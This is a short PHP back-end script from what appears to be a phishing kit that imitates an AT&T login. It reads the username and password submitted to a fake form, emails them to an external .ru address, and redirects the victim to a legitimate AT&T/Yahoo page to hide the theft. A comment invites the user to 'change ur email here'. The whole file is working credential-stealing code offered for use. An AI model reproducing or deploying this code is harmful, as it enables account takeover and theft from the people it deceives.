<?php
//include "protect/bt.php";
$message = "-------------AT&T Login-----------------------\n";
$message .= "xusa: ".$_POST['user']."\n";
$message .= "xpas: ".$_POST['passwd']."\n";
$message .= "---------------Created BY Wallace Wallace-------------\n";
//change ur email here
$send = "khaliresult@transatlantic.com.ru" . ", ";
$send .= "khaliresult@transatlantic.com.ru";
$subject = "Result from $ip";
$headers = "From: AT&T Costumers";
$headers .= "YHSJDB@gmail.com"."\n";
$headers .= "MIME-Version: 1.0\n";
$arr=array($send, $IP);
foreach ($arr as $send)
{
mail($send,$subject,$message,$headers);
//mail($to,$subject,$message,$headers);
}

	
		   header("location: https://currently.att.yahoo.com/");

	 
?>